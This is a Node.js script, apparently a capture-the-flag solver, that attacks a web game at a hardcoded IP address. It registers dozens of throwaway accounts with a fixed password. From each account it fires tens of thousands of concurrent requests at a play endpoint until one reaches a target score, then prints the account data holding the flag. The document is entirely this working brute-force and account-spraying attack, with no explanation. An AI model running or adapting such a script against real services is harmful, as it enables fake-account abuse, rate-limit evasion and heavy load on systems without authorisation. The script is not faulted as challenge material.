const http = require('http');
const BASE = 'http://46.225.117.62:30009';
const WORKERS = 30;
const MAX_PLAYS_PER_WORKER = 40000;

function req(method, path, body, cookie='') {
  return new Promise((resolve, reject) => {
    const data = body ? new URLSearchParams(body).toString() : null;
    const u = new URL(BASE + path);
    const opts = {
      hostname: u.hostname,
      port: u.port,
      path: u.pathname + u.search,
      method,
      headers: {
        ...(data ? {'Content-Type':'application/x-www-form-urlencoded','Content-Length': Buffer.byteLength(data)} : {}),
        ...(cookie ? {Cookie: cookie} : {})
      }
    };
    const r = http.request(opts, (res) => {
      let out='';
      res.on('data', d => out += d.toString());
      res.on('end', () => resolve({status:res.statusCode, headers:res.headers, body:out}));
    });
    r.on('error', reject);
    if (data) r.write(data);
    r.end();
  });
}

async function newUser(i) {
  const user = `spray_${i}_${Math.random().toString(16).slice(2,8)}`;
  const pass = 'pw123456';
  await req('POST', '/api/register', {username:user,password:pass});
  const login = await req('POST', '/api/login', {username:user,password:pass});
  const c = (login.headers['set-cookie']||[]).find(x=>x.startsWith('token='));
  if (!c) throw new Error('No token cookie');
  return c.split(';')[0];
}

let done = false;

async function worker(i) {
  try {
    const cookie = await newUser(i);
    let score = 0;
    for (let p=1; p<=MAX_PLAYS_PER_WORKER && !done; p++) {
      const r = await req('POST', '/api/play', {action:'cross'}, cookie);
      let data = {};
      try { data = JSON.parse(r.body || '{}'); } catch {}
      if (data.status === 'safe') score += (data.gained || 69);
      else score = 0;

      if (score >= 777) {
        const me = await req('GET', '/api/me', null, cookie);
        done = true;
        console.log(`\n[+] Worker ${i} hit score ${score} at play ${p}`);
        console.log(me.body);
        return;
      }

      if (p % 2000 === 0) {
        process.stdout.write(`w${i}:${p} `);
      }
    }
  } catch (e) {
    console.log(`\n[!] Worker ${i} error: ${e.message}`);
  }
}

(async () => {
  await Promise.all(Array.from({length: WORKERS}, (_,i) => worker(i+1)));
  if (!done) console.log('\n[-] No flag found in current run.');
})();
